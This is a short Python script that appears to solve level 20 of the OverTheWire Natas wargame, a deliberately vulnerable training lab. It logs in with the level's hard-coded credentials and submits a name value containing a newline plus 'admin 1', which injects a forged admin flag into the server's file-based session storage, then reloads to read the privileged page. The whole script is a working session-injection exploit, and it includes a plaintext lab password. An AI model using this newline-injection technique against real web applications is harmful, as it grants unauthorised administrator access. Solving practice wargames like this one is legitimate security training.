import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas20', 'slOKYGsjlJhaqKliGvrgWAzln0JyrWao')
url = "http://natas20.natas.labs.overthewire.org"

s = requests.Session()
s.auth = basicAuth

# Request 1: inject the malicious session data
payload = {"name": "foo\nadmin 1"}
r1 = s.post(url, data=payload)

# Request 2: reload — this time $_SESSION["admin"] should be picked up from the file
r2 = s.get(url)
print(r2.text)

